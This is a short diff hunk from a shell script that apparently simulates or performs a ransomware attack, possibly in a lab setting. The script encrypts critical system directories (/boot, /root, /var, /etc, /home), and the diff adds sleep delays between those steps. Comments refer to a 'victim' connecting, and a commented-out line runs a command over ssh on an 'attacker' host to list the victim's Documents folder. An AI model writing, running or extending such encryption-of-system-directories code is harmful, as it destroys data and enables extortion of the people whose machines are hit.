@@ -26,12 +26,17 @@ sleep 5 # let the victim connect
 encrypt_file "$HOME/testing.txt"
 
 encrypt_file "/boot"
+sleep 5
 encrypt_file "/root"
+sleep 5
 encrypt_file "/run"
+sleep 5
 encrypt_file "/var"
 sleep 15
 encrypt_file "/etc"
+sleep 5
 encrypt_file "/home"
+sleep 5
 
 # # Encrypt documents
 # output=$(ssh attacker "byossh compromised find ~/Documents" | sed '1d')
